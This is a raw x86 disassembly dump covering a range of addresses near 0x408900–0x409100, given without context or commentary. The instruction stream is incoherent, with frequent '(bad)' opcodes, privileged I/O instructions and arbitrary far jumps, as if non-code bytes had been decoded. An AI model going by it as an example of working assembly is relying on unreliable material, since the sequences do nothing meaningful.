  40893d:	sub    al,0x65
  40893f:	pop    ss
  408940:	mov    ebp,0x323cdf4
  408945:	hlt    
  408946:	lea    esi,[ebx-0x5f16a389]
  40894c:	cmc    
  40894d:	call   0xc8badb6e
  408952:	sub    DWORD PTR [ecx-0x18572ed0],ebx
  408958:	ss ins DWORD PTR es:[edi],dx
  40895a:	pop    ecx
  40895b:	mov    dh,BYTE PTR [edx]
  40895d:	stc    
  40895e:	mov    esp,0x546a76b8
  408963:	adc    al,0xb1
  408965:	mov    cl,bl
  408967:	mov    esi,0x3ef2275d
  40896c:	pop    edi
  40896d:	mov    esp,0xdc02f2af
  408972:	xchg   ebp,eax
  408973:	add    eax,0x21a2d23b
  408978:	mov    edi,0x4ac6d574
  40897d:	inc    ecx
  40897f:	retf   
  408980:	pop    edx
  408981:	xor    eax,0xbb995d53
  408986:	mov    dl,0x26
  408988:	into   
  408989:	pop    esi
  40898a:	adc    edi,DWORD PTR [ecx+0x7f01a3de]
  408990:	sbb    al,0x83
  408992:	(bad)  
  408993:	sti    
  408994:	mov    ebp,gs
  408996:	popa   
  408997:	cmp    dh,BYTE PTR [edi+0x59cf6544]
  40899d:	push   edx
  40899e:	inc    ecx
  40899f:	mov    dl,0x8
  4089a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089a2:	xchg   dl,cl
  4089a4:	push   ss
  4089a5:	pop    edx
  4089a6:	cmp    DWORD PTR [eax-0x38],esp
  4089a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089aa:	pop    es
  4089ab:	mov    ds:0xa22814f5,al
  4089b0:	sbb    BYTE PTR [esi+0x7f],bh
  4089b3:	js     0x408a2a
  4089b5:	ret    0x793c
  4089b8:	or     ecx,DWORD PTR [edi+0x4f974169]
  4089be:	fld    DWORD PTR [esi-0x6]
  4089c1:	mov    cl,0xa6
  4089c3:	(bad)  
  4089c4:	sti    
  4089c5:	cmp    eax,0x7c1ac442
  4089ca:	loope  0x4089f7
  4089cc:	sub    DWORD PTR [edi-0x73],ebx
  4089cf:	(bad)  
  4089d0:	aam    0xa2
  4089d2:	push   ds
  4089d3:	mov    al,0x14
  4089d5:	and    al,0x85
  4089d7:	dec    esp
  4089d8:	push   ebp
  4089d9:	cmp    DWORD PTR [eax+0x17fe8c8d],eax
  4089df:	push   esi
  4089e0:	or     DWORD PTR [esi-0x44f467b4],ebp
  4089e6:	jbe    0x408a3c
  4089e8:	ja     0x408a26
  4089ea:	and    BYTE PTR [ebx],bl
  4089ec:	dec    edx
  4089ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089ee:	mov    eax,DWORD PTR [esi+0x2d]
  4089f1:	(bad)  
  4089f2:	sbb    bl,BYTE PTR [ecx-0x626a04bb]
  4089f8:	fbstp  TBYTE PTR cs:[ecx+0x58ae276e]
  4089ff:	mov    BYTE PTR [ecx-0x79],cl
  408a02:	push   ecx
  408a03:	xor    ecx,DWORD PTR [ecx+0x53622e5a]
  408a09:	or     al,BYTE PTR [ecx-0x52]
  408a0c:	test   eax,0xc3878e73
  408a11:	dec    ecx
  408a12:	leave  
  408a13:	sahf   
  408a14:	stos   DWORD PTR es:[edi],eax
  408a15:	cld    
  408a16:	xchg   bh,dh
  408a18:	mov    edi,0xb8fd04ec
  408a1d:	push   ebp
  408a1e:	das    
  408a1f:	or     cl,BYTE PTR [edx+0x62]
  408a22:	js     0x408a33
  408a24:	stos   DWORD PTR es:[edi],eax
  408a25:	imul   edi,DWORD PTR [edx-0x4789ed90],0xa157fdd4
  408a2f:	push   edx
  408a30:	iret   
  408a31:	sbb    DWORD PTR [ebp+0x55],ecx
  408a34:	pop    ebp
  408a35:	adc    ah,BYTE PTR [ecx-0x400b761a]
  408a3b:	lock or bh,ah
  408a3e:	arpl   WORD PTR [ebx-0x5981e55a],sp
  408a44:	push   ebx
  408a45:	lahf   
  408a46:	dec    ecx
  408a47:	arpl   WORD PTR [ebp-0x56b4c556],bx
  408a4d:	sti    
  408a4e:	cdq    
  408a4f:	mov    bh,0x53
  408a51:	repnz adc eax,0x3d1e8902
  408a57:	xchg   ebx,eax
  408a58:	cli    
  408a59:	add    BYTE PTR ds:0x84ad1e43,dh
  408a5f:	cdq    
  408a60:	repnz repz inc esp
  408a63:	aas    
  408a64:	lods   al,BYTE PTR ds:[esi]
  408a65:	jge    0x4089fc
  408a67:	xor    BYTE PTR [esi-0x69],dh
  408a6a:	push   edx
  408a6b:	pop    ds
  408a6c:	mul    DWORD PTR [ebx+0x3d97b1c2]
  408a72:	xchg   edi,eax
  408a73:	lock mov dh,0x53
  408a76:	cmp    edx,DWORD PTR [ebx+0x662cd56f]
  408a7c:	test   BYTE PTR [ebx-0x7ddd8be3],dl
  408a82:	(bad)  
  408a83:	neg    DWORD PTR [edi-0x5484c166]
  408a89:	and    BYTE PTR [eax],dh
  408a8b:	add    al,0x7a
  408a8d:	xchg   edx,eax
  408a8e:	ins    BYTE PTR es:[edi],dx
  408a8f:	in     eax,dx
  408a90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a91:	daa    
  408a92:	mov    bh,0x97
  408a94:	ss xchg bp,ax
  408a97:	ficomp DWORD PTR [edi]
  408a99:	retf   0x201e
  408a9c:	call   0x16f8:0x48233722
  408aa3:	inc    esp
  408aa4:	std    
  408aa5:	adc    ah,BYTE PTR [eax+0x4fed88d4]
  408aab:	jle    0x408af2
  408aad:	push   esi
  408aae:	fist   WORD PTR [ebp+0x301e9b7]
  408ab4:	fmul   DWORD PTR [edi-0x53]
  408ab7:	and    eax,0x5ad8d98
  408abc:	mov    ecx,0x45afc527
  408ac1:	(bad)  
  408ac2:	fs not al
  408ac5:	cmp    esi,DWORD PTR [esp+esi*2]
  408ac8:	nop
  408ac9:	pop    esp
  408aca:	adc    al,0xb5
  408acc:	js     0x408aeb
  408ace:	cmp    dl,BYTE PTR [ebx-0x78a28c11]
  408ad4:	je     0x408b36
  408ad6:	xchg   edi,eax
  408ad7:	and    DWORD PTR [esi],ebp
  408ad9:	adc    al,0xc2
  408adb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408adc:	lods   eax,DWORD PTR ds:[esi]
  408add:	sub    eax,0xeacf2d6c
  408ae2:	stc    
  408ae3:	in     al,0x12
  408ae5:	xchg   esi,eax
  408ae6:	mov    BYTE PTR [ebx-0x54],cl
  408ae9:	dec    ecx
  408aea:	adc    BYTE PTR [edi],dh
  408aec:	mov    dl,0xf1
  408aee:	cmp    dh,bl
  408af0:	jae    0x408ad3
  408af2:	hlt    
  408af3:	cld    
  408af4:	repz xchg ebx,eax
  408af6:	enter  0x6440,0x8d
  408afa:	fsubr  st,st(2)
  408afc:	cmp    DWORD PTR [esi+0x11d557d1],edx
  408b02:	mov    al,ds:0x25535361
  408b07:	add    al,0x82
  408b09:	xor    BYTE PTR [esi-0x3a],0xaf
  408b0d:	test   BYTE PTR [eax],ah
  408b0f:	scas   eax,DWORD PTR es:[edi]
  408b10:	xchg   BYTE PTR [ebx-0x1a],ch
  408b13:	shl    edi,0xfc
  408b16:	pop    ebp
  408b17:	jge    0x408b85
  408b19:	mov    esi,0x6bfdad4b
  408b1e:	add    esp,esp
  408b20:	mov    dl,0xde
  408b22:	lea    eax,[eax+0x6f5b9ff7]
  408b28:	(bad)  
  408b29:	mov    esi,0x8776cdbf
  408b2e:	inc    eax
  408b2f:	cs xor ebx,0x8e703f01
  408b36:	icebp  
  408b37:	mov    bl,0x7
  408b39:	jecxz  0x408ba8
  408b3b:	call   0x8acb:0xa4effd92
  408b42:	popa   
  408b43:	dec    ebp
  408b44:	mov    bl,0x5b
  408b46:	stc    
  408b47:	mov    edx,0x389dbfbb
  408b4c:	rcl    BYTE PTR [ebx],0x9a
  408b4f:	cmp    al,0x17
  408b51:	js     0x408b63
  408b53:	(bad)  
  408b54:	jmp    0xa1f8:0x9eac1e55
  408b5b:	cli    
  408b5c:	xchg   DWORD PTR [eax+0x20],edx
  408b5f:	cmp    al,0x27
  408b61:	xchg   ebx,eax
  408b62:	rol    dl,cl
  408b64:	fwait
  408b65:	stos   BYTE PTR es:[edi],al
  408b66:	mov    al,0xec
  408b68:	mov    edi,0x125e772a
  408b6d:	loopne 0x408bdf
  408b6f:	daa    
  408b70:	jmp    0x74a3:0xef531757
  408b77:	xor    BYTE PTR es:[eax+0x4f],ch
  408b7b:	sar    DWORD PTR [ebx+esi*1-0x49],cl
  408b7f:	bound  edx,QWORD PTR [edi+0xa026cc6]
  408b85:	mov    ebx,0xd1aeea7
  408b8a:	mov    ds:0xdbd1febf,al
  408b8f:	fcomp  DWORD PTR [ecx-0x23e8302f]
  408b95:	ds pop esi
  408b97:	shl    BYTE PTR [ecx-0x2f],cl
  408b9a:	in     eax,dx
  408b9b:	xor    ch,BYTE PTR [ecx+ebx*1]
  408b9e:	pushf  
  408b9f:	sbb    al,0x3e
  408ba1:	scas   al,BYTE PTR es:[edi]
  408ba2:	(bad)  
  408ba3:	xchg   ebp,eax
  408ba4:	push   DWORD PTR [esi+0x34]
  408ba7:	inc    eax
  408ba8:	sbb    ebx,DWORD PTR [edx+0x39]
  408bab:	stc    
  408bac:	adc    al,0xb8
  408bae:	sub    cl,BYTE PTR ds:0x60071aab
  408bb4:	xor    BYTE PTR [edi-0x44],bl
  408bb7:	push   ebp
  408bb8:	and    eax,0x3c272e64
  408bbd:	into   
  408bbe:	in     al,dx
  408bbf:	jb     0x408b66
  408bc1:	dec    esp
  408bc2:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bc4:	xchg   DWORD PTR [eax],ebp
  408bc6:	addr16 dec ecx
  408bc8:	add    edi,DWORD PTR fs:[eax-0x5d737f19]
  408bcf:	or     dl,BYTE PTR [edi+eax*8]
  408bd2:	and    DWORD PTR [edi+0x1b6dd258],esp
  408bd8:	cmc    
  408bd9:	xchg   BYTE PTR [ecx+eiz*8],bl
  408bdc:	(bad)  
  408bdd:	adc    eax,0x8b30ca6b
  408be2:	test   al,0xbc
  408be4:	jmp    0x3759:0x7c8570eb
  408beb:	or     ecx,DWORD PTR [ebx-0xb]
  408bee:	mov    eax,DWORD PTR [edi-0x1e40f57f]
  408bf4:	xchg   edi,eax
  408bf5:	hlt    
  408bf6:	sub    edx,ebx
  408bf8:	repz sub dl,0x37
  408bfc:	out    0x2f,eax
  408bfe:	mov    ch,ch
  408c00:	xor    ah,al
  408c02:	pusha  
  408c03:	and    DWORD PTR [ebp+0x1a],ebp
  408c06:	rcl    ecx,0x81
  408c09:	ss add cl,dh
  408c0c:	jb     0x408c83
  408c0e:	inc    eax
  408c0f:	loope  0x408c8e
  408c11:	dec    edx
  408c12:	xchg   ebx,eax
  408c13:	and    DWORD PTR [ebp-0x2a999028],edi
  408c19:	add    ecx,DWORD PTR [ebx]
  408c1b:	(bad)  
  408c1c:	sbb    eax,0xcd28b4b5
  408c21:	push   eax
  408c22:	jp     0x408c01
  408c24:	aam    0x0
  408c26:	arpl   WORD PTR [edx+0x34],di
  408c29:	adc    DWORD PTR [edi+0x6afc9f8d],ebp
  408c2f:	pusha  
  408c30:	sub    eax,ebx
  408c32:	lods   al,BYTE PTR ds:[esi]
  408c33:	in     eax,0x68
  408c35:	lods   al,BYTE PTR ds:[esi]
  408c36:	in     al,0x4a
  408c38:	inc    edi
  408c39:	xor    eax,DWORD PTR [edi-0xe]
  408c3c:	shr    BYTE PTR [edi-0x2b9c1696],0x6a
  408c43:	fcmove st,st(6)
  408c45:	dec    eax
  408c46:	call   0x1e37c7ab
  408c4b:	add    al,0x73
  408c4d:	fisttp DWORD PTR [edi+0x387e17a6]
  408c53:	imul   BYTE PTR [edx]
  408c55:	push   edi
  408c56:	mov    edi,0xca6c7317
  408c5b:	or     DWORD PTR [ecx],ebx
  408c5d:	or     ebp,ebx
  408c5f:	out    0x54,eax
  408c61:	ins    BYTE PTR es:[edi],dx
  408c62:	je     0x408c45
  408c64:	push   cs
  408c65:	dec    ecx
  408c66:	lods   al,BYTE PTR ds:[esi]
  408c67:	pop    ss
  408c68:	adc    DWORD PTR [edx-0x61],esi
  408c6b:	jne    0x408c29
  408c6d:	or     BYTE PTR [edi+0x4a3d9185],dh
  408c73:	cmp    esp,edi
  408c75:	cmp    edi,DWORD PTR [ecx-0x1f3db705]
  408c7b:	lods   al,BYTE PTR ds:[esi]
  408c7c:	mov    esp,0xa3beec62
  408c81:	nop
  408c82:	xor    BYTE PTR [ebx+0x372b7e50],al
  408c88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c89:	nop
  408c8a:	mov    edx,0xb6f35573
  408c8f:	xor    al,0x3c
  408c91:	jge    0x408c79
  408c93:	mov    al,ds:0x549ded12
  408c98:	mov    DWORD PTR [edi+0x24],edx
  408c9b:	retf   
  408c9c:	mov    dh,0x30
  408c9e:	fwait
  408c9f:	ds call 0x6bc1:0x9d835e8a
  408ca7:	iret   
  408ca8:	(bad)  
  408ca9:	imul   ebx,esp,0x1b
  408cac:	push   cs
  408cad:	or     eax,0x5df6d207
  408cb2:	sub    ecx,DWORD PTR [ecx-0x1bdcbaed]
  408cb8:	lds    edi,FWORD PTR [edi-0xf23a293]
  408cbe:	repnz mov esi,0x96b86900
  408cc4:	retf   0xc212
  408cc7:	mov    edi,0x9af4ac6a
  408ccc:	sub    ah,BYTE PTR [edi-0x7]
  408ccf:	and    edi,edi
  408cd1:	pop    ds
  408cd2:	ret    0x1155
  408cd5:	ret    0xb30f
  408cd8:	xchg   esi,eax
  408cd9:	mov    ah,0x11
  408cdb:	push   esp
  408cdc:	fldcw  WORD PTR [esi-0x4ded4b91]
  408ce2:	xchg   ecx,eax
  408ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ce4:	pop    edx
  408ce5:	in     eax,dx
  408ce6:	test   eax,0x353833e0
  408ceb:	mov    eax,DWORD PTR [esi-0x3e5e7047]
  408cf1:	nop
  408cf2:	push   ss
  408cf3:	pop    ebx
  408cf4:	iret   
  408cf5:	or     al,0x5d
  408cf7:	push   edi
  408cf8:	test   BYTE PTR [ebx+ebx*4],dl
  408cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cfc:	into   
  408cfd:	fwait
  408cfe:	ins    DWORD PTR es:[edi],dx
  408cff:	push   ebx
  408d00:	(bad)  
  408d01:	pavgw  mm3,mm6
  408d04:	and    BYTE PTR [ebp+0x3fb75313],cl
  408d0a:	cs mov ah,0xea
  408d0d:	dec    esp
  408d0e:	(bad)  
  408d0f:	or     BYTE PTR [ebp+0x260d79ab],bl
  408d15:	sti    
  408d16:	xor    al,0xcb
  408d18:	sub    eax,esp
  408d1a:	stos   BYTE PTR es:[edi],al
  408d1b:	mov    ebp,0x2f771916
  408d20:	(bad)  [eax-0x5c]
  408d23:	repz and eax,DWORD PTR [esi]
  408d26:	imul   esi,DWORD PTR [edi-0x7b11d4b4],0x3b
  408d2d:	and    eax,edx
  408d2f:	(bad)  
  408d30:	cli    
  408d31:	test   DWORD PTR [esi-0x2],ebp
  408d34:	rep outs dx,BYTE PTR ds:[esi]
  408d36:	xchg   ecx,eax
  408d37:	cmp    eax,0xb6fafff2
  408d3c:	fst    QWORD PTR [esi-0x21671302]
  408d42:	sbb    DWORD PTR [ebx-0x37],edx
  408d45:	pop    eax
  408d46:	(bad)  
  408d47:	cmp    ebx,DWORD PTR [edx]
  408d49:	rcr    BYTE PTR [ebx],0xf6
  408d4c:	mov    al,0xb7
  408d4e:	mov    dh,0x55
  408d50:	xchg   edi,eax
  408d51:	aaa    
  408d52:	cld    
  408d53:	daa    
  408d54:	sub    BYTE PTR [esi+0x4d2580d],al
  408d5a:	ret    
  408d5b:	rol    BYTE PTR [ebx+edi*2],1
  408d5e:	leave  
  408d5f:	push   esp
  408d60:	inc    edx
  408d61:	popa   
  408d62:	dec    ecx
  408d63:	xchg   esi,eax
  408d64:	loop   0x408ce6
  408d66:	dec    edx
  408d67:	dec    ebx
  408d68:	js     0x408d26
  408d6a:	data16 mov fs,WORD PTR [ecx]
  408d6d:	outs   dx,DWORD PTR ds:[esi]
  408d6e:	or     cl,BYTE PTR [eax]
  408d70:	push   edi
  408d71:	cmp    dh,BYTE PTR [ecx]
  408d73:	or     edx,DWORD PTR [esi+0x2e30bc98]
  408d79:	mov    eax,ds:0x6f3cef12
  408d7e:	push   0xfffffffd
  408d80:	popa   
  408d81:	clc    
  408d82:	leave  
  408d83:	arpl   WORD PTR [edx+0x1],bp
  408d86:	cmc    
  408d87:	adc    al,dl
  408d89:	sti    
  408d8a:	scas   eax,DWORD PTR es:[edi]
  408d8b:	clc    
  408d8c:	sbb    eax,0x2db18696
  408d91:	bound  ecx,QWORD PTR [ebx]
  408d93:	push   es
  408d94:	les    esi,FWORD PTR [edi]
  408d96:	mov    al,ds:0xbc1b655
  408d9b:	sbb    edx,esp
  408d9d:	mul    DWORD PTR [esi]
  408d9f:	stc    
  408da0:	test   al,0x88
  408da2:	dec    ebp
  408da3:	xlat   BYTE PTR ds:[ebx]
  408da4:	mov    eax,DWORD PTR [edx]
  408da6:	push   0xffffffe7
  408da8:	das    
  408da9:	retf   
  408daa:	lock loopne 0x408d9a
  408dad:	cmp    esi,ebp
  408daf:	addr16 cld 
  408db1:	push   ebp
  408db2:	jmp    0x51c622a0
  408db7:	aas    
  408db8:	out    dx,al
  408db9:	add    eax,0x1bcc6aa1
  408dbe:	sar    BYTE PTR [ebp+0x49],cl
  408dc1:	jnp    0x408d4c
  408dc3:	push   es
  408dc4:	adc    DWORD PTR [ecx],edi
  408dc6:	das    
  408dc7:	js     0x408dab
  408dc9:	pop    esi
  408dca:	clc    
  408dcb:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dcd:	sub    ecx,DWORD PTR [ebp-0x69]
  408dd0:	sub    DWORD PTR ds:0xf6fcbdec,edi
  408dd6:	or     DWORD PTR [eax-0x33],0xa4a4abcb
  408ddd:	les    esi,FWORD PTR ds:0x545f43e7
  408de3:	adc    edx,esp
  408de5:	cmp    al,0x31
  408de7:	ror    BYTE PTR [ecx],1
  408de9:	leave  
  408dea:	inc    ecx
  408deb:	xchg   edi,eax
  408dec:	push   edi
  408ded:	jb     0x408e0f
  408def:	test   esp,eax
  408df1:	jge    0x408e43
  408df3:	fnstsw WORD PTR [ebx]
  408df5:	pop    es
  408df6:	out    dx,al
  408df7:	adc    al,0xd5
  408df9:	xchg   BYTE PTR [ecx-0x444caeae],bh
  408dff:	and    ecx,DWORD PTR [edi+edx*8+0x40]
  408e03:	sub    edi,DWORD PTR [ebx+0x4356195e]
  408e09:	fdiv   DWORD PTR [edi-0x54]
  408e0c:	(bad)  
  408e0e:	mov    ecx,0xb9273ca7
  408e13:	pop    edi
  408e14:	inc    edi
  408e15:	or     ch,BYTE PTR [eax-0x2eb59891]
  408e1b:	call   0xe977:0x9dfa51fd
  408e22:	popf   
  408e23:	ret    0x9bb4
  408e26:	sahf   
  408e27:	push   ebx
  408e28:	jl     0x408e06
  408e2a:	mov    ah,0xd5
  408e2c:	mov    cl,0x5
  408e2e:	adc    esi,DWORD PTR [edx]
  408e30:	imul   eax,ebx,0x32
  408e33:	mov    ecx,0x136d0a06
  408e38:	sbb    edi,ebp
  408e3a:	repnz nop
  408e3c:	nop
  408e3d:	ins    BYTE PTR es:[edi],dx
  408e3e:	test   edi,0x14bdca6
  408e44:	mov    esi,DWORD PTR [ebp+eax*2+0x4d7c518c]
  408e4b:	data16 mov bh,0x9
  408e4e:	cmp    BYTE PTR [esi],ah
  408e50:	push   eax
  408e51:	mov    ecx,DWORD PTR [ecx+0x51433b0e]
  408e57:	xchg   ecx,eax
  408e58:	mul    DWORD PTR [edi-0x154b6fb6]
  408e5e:	aas    
  408e5f:	inc    esi
  408e60:	cli    
  408e61:	xchg   esi,eax
  408e62:	xor    DWORD PTR [edx-0x7e],edx
  408e65:	test   ax,0x47c
  408e69:	mov    ds:0xc2171131,al
  408e6e:	ins    DWORD PTR es:[edi],dx
  408e6f:	pop    ss
  408e70:	add    al,0x91
  408e72:	cs mov bl,0xe6
  408e75:	mov    ds:0xfdfaa5c8,eax
  408e7a:	das    
  408e7b:	add    DWORD PTR [ebx+esi*8-0x53868e2a],0xffffff96
  408e83:	add    eax,0x275f25e5
  408e88:	mov    al,ds:0x766d7a52
  408e8d:	repnz imul esp,DWORD PTR [ebx],0x51
  408e91:	and    eax,0x9d189ced
  408e96:	xchg   DWORD PTR [ebx],esi
  408e98:	aaa    
  408e99:	xchg   DWORD PTR [edi-0x735ed6a7],ecx
  408e9f:	leave  
  408ea0:	xor    ah,bl
  408ea2:	repz test BYTE PTR es:[edi],ah
  408ea6:	ficom  DWORD PTR [edi-0x2ce7d80e]
  408eac:	xor    BYTE PTR [edi+0x5d1f1392],al
  408eb2:	loopne 0x408f17
  408eb4:	cmp    BYTE PTR [esp+esi*4+0x201ab06],0x44
  408ebc:	cs push ds
  408ebe:	outs   dx,BYTE PTR ds:[esi]
  408ebf:	jle    0x408ec9
  408ec1:	mov    edi,0x8e26087d
  408ec6:	and    DWORD PTR [eax-0x4d40590],ebp
  408ecc:	nop
  408ecd:	mov    cl,0xb5
  408ecf:	dec    esp
  408ed0:	sbb    BYTE PTR [ebp+0x43],cl
  408ed3:	mov    ebp,DWORD PTR [edi+eax*8-0x3b]
  408ed7:	icebp  
  408ed8:	fdivr  st,st(7)
  408eda:	(bad)  
  408edb:	mov    esp,0x6b756331
  408ee0:	jge    0x408e90
  408ee2:	out    dx,al
  408ee3:	jbe    0x408ed7
  408ee5:	ret    0x6a50
  408ee8:	ds sub al,0x51
  408eeb:	test   DWORD PTR [ecx-0x32],ecx
  408eee:	idiv   BYTE PTR [edx+0x3b9d6a83]
  408ef4:	into   
  408ef5:	cmp    DWORD PTR [ebp-0x1859293b],esi
  408efb:	fisubr WORD PTR [eax-0x69]
  408efe:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  408f00:	add    eax,0x145b8fdc
  408f05:	inc    ebp
  408f06:	mov    ebx,0x71db505e
  408f0b:	div    BYTE PTR [edx]
  408f0d:	call   0x2c6b1fbc
  408f12:	imul   bh
  408f14:	jecxz  0x408f4d
  408f16:	jp     0x408eb1
  408f18:	cs mov edi,0x7a48258a
  408f1e:	inc    ecx
  408f1f:	xlat   BYTE PTR ds:[ebx]
  408f20:	jmp    0x4231:0x5516074a
  408f27:	(bad)  
  408f28:	in     eax,dx
  408f29:	popf   
  408f2a:	out    0x28,al
  408f2c:	idiv   DWORD PTR [edi-0x7]
  408f2f:	push   edx
  408f30:	mov    ds:0xef740230,al
  408f35:	gs pop ebp
  408f37:	and    BYTE PTR [eax],bh
  408f39:	mov    dl,0x9b
  408f3b:	lahf   
  408f3c:	inc    edi
  408f3d:	inc    esp
  408f3e:	shl    BYTE PTR [esp+eiz*4],cl
  408f41:	test   al,0x34
  408f43:	push   edx
  408f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f45:	imul   esp,DWORD PTR [ebp-0x1696841f],0xf
  408f4c:	js     0x408f73
  408f4e:	sbb    eax,0x9da0ea5c
  408f53:	sbb    WORD PTR [eax+0x67373168],0xffba
  408f5b:	test   eax,0xdcaf3782
  408f60:	sahf   
  408f61:	jbe    0x408fb1
  408f63:	in     eax,dx
  408f64:	mov    edi,0xbbb6ec83
  408f69:	adc    BYTE PTR [ecx+edx*2-0x1b0a5e5b],dl
  408f70:	or     edx,ebx
  408f72:	mov    dh,0x80
  408f74:	dec    esi
  408f75:	fdiv   QWORD PTR [ebx-0x64]
  408f78:	xor    eax,0xbcb502e2
  408f7d:	add    ebx,DWORD PTR [esi+0x58056286]
  408f83:	mov    dl,BYTE PTR [edi+0x7ee9ca1f]
  408f89:	jmp    0x3006fddf
  408f8e:	(bad)  
  408f8f:	dec    ebp
  408f90:	inc    eax
  408f91:	jge    0x408f8c
  408f93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f94:	cmp    ebp,esp
  408f96:	sbb    ebx,DWORD PTR [eax-0x661499c6]
  408f9c:	das    
  408f9d:	mov    esp,0x4ef9cc72
  408fa2:	aad    0xcd
  408fa4:	sbb    al,0x14
  408fa6:	jb     0x409008
  408fa8:	fcmovb st,st(1)
  408faa:	bound  ebx,QWORD PTR [ebp+0x1e6172b1]
  408fb0:	repz sub ecx,DWORD PTR [esi-0x72]
  408fb4:	in     eax,0xf8
  408fb6:	jae    0x408f47
  408fb8:	push   ebx
  408fb9:	dec    ebx
  408fba:	rcl    BYTE PTR [ebp+0x3c],cl
  408fbd:	das    
  408fbe:	bound  edi,QWORD PTR [ecx]
  408fc0:	xchg   edi,eax
  408fc1:	mov    eax,0x65ca22cf
  408fc6:	cwde   
  408fc7:	pop    esp
  408fc8:	mov    edx,0xdb82b7f4
  408fcd:	jne    0x408fb8
  408fcf:	or     eax,0xaa5801a6
  408fd4:	push   eax
  408fd5:	fwait
  408fd6:	pop    eax
  408fd7:	push   cs
  408fd8:	mov    cs,ebx
  408fda:	xchg   edi,eax
  408fdb:	int    0xcf
  408fdd:	fidiv  DWORD PTR [esi-0x1c856407]
  408fe3:	pop    edx
  408fe4:	in     eax,0x72
  408fe6:	and    al,BYTE PTR [ebx+0x134124e1]
  408fec:	je     0x408ffb
  408fee:	mov    ebp,0x3996866c
  408ff3:	mov    ds:0x35dd5feb,eax
  408ff8:	pushf  
  408ff9:	mov    esp,0x60213b41
  408ffe:	inc    ebx
  408fff:	jmp    0x6ece:0x7cbe153a
  409006:	pop    ebx
  409007:	cs hlt 
  409009:	ret    0x24aa
  40900c:	clc    
  40900d:	aam    0xbb
  40900f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409010:	out    dx,eax
  409011:	fistp  DWORD PTR [edi]
  409013:	(bad)  
  409014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409015:	push   ss
  409016:	test   al,ah
  409018:	int    0x60
  40901a:	outs   dx,BYTE PTR ds:[esi]
  40901b:	and    esp,eax
  40901d:	(bad)  
  40901e:	(bad)  
  40901f:	das    
  409020:	inc    ebp
  409021:	fs enter 0xbfc9,0x57
  409026:	pop    es
  409027:	xchg   ecx,eax
  409028:	mov    eax,0x335a1ba6
  40902d:	pop    ds
  40902e:	lods   al,BYTE PTR ds:[esi]
  40902f:	call   0xaecf96fe
  409034:	ss test al,0xfb
  409037:	test   al,0x2d
  409039:	ror    DWORD PTR [eax-0x4a4f8643],1
  40903f:	hlt    
  409040:	stc    
  409041:	bound  esp,QWORD PTR [ecx]
  409043:	loop   0x409075
  409045:	fwait
  409046:	jle    0x40904b
  409048:	add    al,0xd2
  40904a:	in     al,dx
  40904b:	push   cs
  40904c:	stos   DWORD PTR es:[edi],eax
  40904d:	mov    esp,0x55be11df
  409052:	jo     0x4090cf
  409054:	sar    BYTE PTR [eax+0x5b],1
  409057:	fcmovbe st,st(4)
  409059:	or     bh,ah
  40905b:	mov    bl,0x47
  40905d:	jnp    0x409000
  40905f:	das    
  409060:	push   ebx
  409061:	mov    bl,bh
  409063:	in     al,dx
  409064:	in     eax,0x41
  409066:	mov    bl,0x8
  409068:	(bad)  
  40906a:	cwde   
  40906b:	(bad)  ds:0xc006a272
  409071:	sbb    DWORD PTR [esi+0x12],0x1a71124d
  409078:	lds    edi,FWORD PTR [edx-0x22cd428e]
  40907e:	inc    edx
  40907f:	out    dx,al
  409080:	sub    al,BYTE PTR [esi+edi*8]
  409083:	adc    DWORD PTR [eax+eax*8],esi
  409086:	sbb    dl,BYTE PTR [edx-0x3]
  409089:	xchg   edi,eax
  40908a:	(bad)  
  40908c:	dec    eax
  40908d:	in     al,dx
  40908e:	stc    
  40908f:	inc    edi
  409090:	jecxz  0x409096
  409092:	jb     0x40907d
  409094:	adc    BYTE PTR [ebx+0x4953ab8a],0xfc
  40909b:	inc    ecx
  40909c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40909d:	mov    ch,0x5d
  40909f:	fisubr WORD PTR [ebx+0x42]
  4090a2:	or     esp,DWORD PTR [esi+0x3c]
  4090a5:	out    dx,eax
  4090a6:	cmp    DWORD PTR [ebx+0x13599277],esi
  4090ac:	aam    0xfb
  4090ae:	adc    dh,BYTE PTR [edx+ebp*2+0x38ca99b2]
  4090b5:	mov    al,BYTE PTR [edi]
  4090b7:	xchg   edi,eax
  4090b8:	sbb    ah,BYTE PTR [edx+esi*1+0x10]
  4090bc:	inc    edx
  4090bd:	enter  0x8b75,0x51
  4090c1:	push   ss
  4090c2:	pushf  
  4090c3:	call   0xe013:0x15b227b
  4090ca:	add    ecx,DWORD PTR [ecx]
  4090cc:	fild   QWORD PTR [ecx-0x6c684927]
  4090d2:	sbb    DWORD PTR [esi+0x50],ecx
  4090d5:	xor    edx,edi
  4090d7:	dec    eax
  4090d8:	outs   dx,DWORD PTR ds:[esi]
  4090d9:	cmp    eax,0x65dd4839
  4090de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090df:	fwait
  4090e0:	int    0x11
  4090e2:	jge    0x409142
  4090e4:	jge    0x4090d7
  4090e6:	das    
  4090e7:	out    0xc3,eax
  4090e9:	mov    dl,0x5a
  4090eb:	(bad)  
  4090ec:	or     eax,0xdf0e576f
  4090f1:	in     eax,dx
  4090f2:	sbb    DWORD PTR [ebx+0x16],ebp
  4090f5:	jno    0x409140
  4090f7:	jg     0x4090b3
  4090f9:	jbe    0x4090bd
  4090fb:	in     al,0x5a
  4090fd:	dec    esi
  4090fe:	rcl    ebp,1
  409100:	scas   al,BYTE PTR es:[edi]
  409101:	xchg   edx,eax
  409102:	shr    DWORD PTR [ebp-0x35],cl
